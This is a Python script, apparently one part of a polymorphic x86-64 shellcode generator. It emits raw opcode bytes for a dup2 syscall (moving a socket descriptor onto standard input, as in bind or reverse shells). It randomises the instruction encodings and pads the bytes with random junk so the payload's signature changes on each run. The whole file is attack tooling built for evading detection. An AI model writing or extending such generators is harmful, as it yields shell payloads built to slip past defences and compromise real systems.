#!/usr/bin/env python3
import random
from func_instu import *

def partie3():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movx('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movx('al', 33)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    xorrsi = randomxor('rsi') # xor rsi, rsi
    syscall = '\\x0f\\x05' # syscall


    resultat_concat = resultat + pushr8 + poprdi + xorrsi + syscall

    y = random.randint(0, 2)
    
    match y : 
        case 1 :
            resultat_concat = full_random() + resultat + pushr8 + poprdi + xorrsi + syscall
        case 2 : 
            resultat_concat = resultat + full_random() + pushr8 + full_random() + poprdi + xorrsi + syscall


    return resultat_concat